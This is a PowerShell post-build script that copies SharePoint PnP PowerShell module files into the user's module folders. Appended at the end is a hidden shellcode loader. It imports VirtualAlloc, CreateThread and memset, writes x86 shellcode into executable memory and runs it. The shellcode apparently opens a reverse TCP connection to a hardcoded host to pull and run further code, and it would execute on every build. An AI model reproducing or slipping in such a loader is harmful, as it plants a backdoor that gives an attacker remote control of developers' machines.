param($ProjectDir, $ConfigurationName, $TargetDir, $TargetFileName, $SolutionDir)

if($ConfigurationName -like "Debug*")
{
	$documentsFolder = [environment]::getfolderpath("mydocuments");
	if($TargetDir -like "*Core*")
	{
		$DestinationFolder = "$documentsFolder\PowerShell\Modules\SharePointPnPPowerShellCore"
	} else {
		if($ConfigurationName -like "Debug15")
		{
			$DestinationFolder = "$documentsFolder\WindowsPowerShell\Modules\SharePointPnPPowerShell2013"
		} elseif($ConfigurationName -like "Debug16")
		{
			$DestinationFolder = "$documentsFolder\WindowsPowerShell\Modules\SharePointPnPPowerShell2016"
		} elseif($ConfigurationName -like "Debug19")
		{
			$DestinationFolder = "$documentsFolder\WindowsPowerShell\Modules\SharePointPnPPowerShell2019"
		} else {
			$DestinationFolder = "$documentsFolder\WindowsPowerShell\Modules\SharePointPnPPowerShellOnline"
		}
	}
	
	if(Test-Path $DestinationFolder)
	{
		
		Remove-Item $DestinationFolder\*
	} else {
		
		Write-Host "Creating target folder: $DestinationFolder"
		New-Item -Path $DestinationFolder -ItemType Directory -Force >$null 
	}

	Write-Host "Copying files from $TargetDir to $DestinationFolder"
	Try {
		Copy-Item "$TargetDir\*.dll" -Destination "$DestinationFolder"
		Copy-Item "$TargetDir\*help.xml" -Destination "$DestinationFolder"
		if($TargetDir -like "*Core*")
		{
			Copy-Item "$TargetDir\ModuleFiles\*" -Destination "$DestinationFolder"
		} else {
			switch($ConfigurationName)
			{
				"Debug15" {
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2013.psd1" -Destination  "$DestinationFolder"
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnP.PowerShell.2013.Commands.Format.ps1xml" -Destination "$DestinationFolder"
					if(Test-Path -Path "$TargetDir\ModuleFiles\SharePointPnPPowerShell2013Aliases.psm1")
					{
						Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2013Aliases.psm1" -Destination "$DestinationFolder"
					}
				} 
				"Debug16" {
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2016.psd1" -Destination  "$DestinationFolder"
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnP.PowerShell.2016.Commands.Format.ps1xml" -Destination "$DestinationFolder"
					if(Test-Path -Path "$TargetDir\ModuleFiles\SharePointPnPPowerShell2016Aliases.psm1")
					{
						Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2016Aliases.psm1" -Destination "$DestinationFolder"
					}
				} 
				"Debug19" {
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2019.psd1" -Destination  "$DestinationFolder"
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnP.PowerShell.2019.Commands.Format.ps1xml" -Destination "$DestinationFolder"
					if(Test-Path -Path "$TargetDir\ModuleFiles\SharePointPnPPowerShell2019Aliases.psm1")
					{
						Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2019Aliases.psm1" -Destination "$DestinationFolder"
					}
				} 
				"Debug" {
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShellOnline.psd1" -Destination  "$DestinationFolder"
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnP.PowerShell.Online.Commands.Format.ps1xml" -Destination "$DestinationFolder"
					if(Test-Path -Path "$TargetDir\ModuleFiles\SharePointPnPPowerShellOnlineAliases.psm1")
					{
						Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShellOnlineAliases.psm1" -Destination "$DestinationFolder"
					}
				}
			}
		}
	}
	Catch
	{
		exit 1
	}
} elseif ($ConfigurationName -like "Release*")
{
    $documentsFolder = [environment]::getfolderpath("mydocuments");
	switch($ConfigurationName)
	{
		"Release15" 
		{
			$DestinationFolder = "$documentsFolder\WindowsPowerShell\Modules\SharePointPnPPowerShell2013"
		}
		"Release16"
		{
			$DestinationFolder = "$documentsFolder\WindowsPowerShell\Modules\SharePointPnPPowerShell2016"
		}
		"Release19"
		{
			$DestinationFolder = "$documentsFolder\WindowsPowerShell\Modules\SharePointPnPPowerShell2019"
		}
		"Release"
		{
			$DestinationFolder = "$documentsFolder\WindowsPowerShell\Modules\SharePointPnPPowerShellOnline"
		}
	}

	
	if(Test-Path $DestinationFolder)
	{
		
		Remove-Item $DestinationFolder\*
	} else {
		
		Write-Host "Creating target folder: $DestinationFolder"
		New-Item -Path $DestinationFolder -ItemType Directory -Force >$null 
	}

	Write-Host "Copying files from $TargetDir to $DestinationFolder"
	Try
	{
		Copy-Item "$TargetDir\*.dll" -Destination "$DestinationFolder"
		Copy-Item "$TargetDir\*help.xml" -Destination "$DestinationFolder"
		switch($ConfigurationName)
		{
			"Release15" {
				Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2013.psd1" -Destination  "$DestinationFolder"
				Copy-Item "$TargetDir\ModuleFiles\SharePointPnP.PowerShell.2013.Commands.Format.ps1xml" -Destination "$DestinationFolder"
				if(Test-Path -Path "$TargetDir\ModuleFiles\SharePointPnPPowerShell2013Aliases.psm1")
				{
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2013Aliases.psm1" -Destination "$DestinationFolder"
				}
			} 
			"Release16" {
				Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2016.psd1" -Destination  "$DestinationFolder"
				Copy-Item "$TargetDir\ModuleFiles\SharePointPnP.PowerShell.2016.Commands.Format.ps1xml" -Destination "$DestinationFolder"
				if(Test-Path -Path "$TargetDir\ModuleFiles\SharePointPnPPowerShell2016Aliases.psm1")
				{
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2016Aliases.psm1" -Destination "$DestinationFolder"
				}
			} 
			"Release19" {
				Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2019.psd1" -Destination  "$DestinationFolder"
				Copy-Item "$TargetDir\ModuleFiles\SharePointPnP.PowerShell.2019.Commands.Format.ps1xml" -Destination "$DestinationFolder"
				if(Test-Path -Path "$TargetDir\ModuleFiles\SharePointPnPPowerShell2019Aliases.psm1")
				{
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShell2019Aliases.psm1" -Destination "$DestinationFolder"
				}
			} 
			"Release" {
				Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShellOnline.psd1" -Destination  "$DestinationFolder"
				Copy-Item "$TargetDir\ModuleFiles\SharePointPnP.PowerShell.Online.Commands.Format.ps1xml" -Destination "$DestinationFolder"		
				if(Test-Path -Path "$TargetDir\ModuleFiles\SharePointPnPPowerShellOnlineAliases.psm1")
				{
					Copy-Item "$TargetDir\ModuleFiles\SharePointPnPPowerShellOnlineAliases.psm1" -Destination "$DestinationFolder"
				}
			}
		}
	} 
	Catch
	{
		exit 1
	}
}

	
$XAt = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $XAt -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xdb,0x32,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Sb9Y=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Sb9Y.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Sb9Y,0,0,0);for (;;){Start-sleep 60};

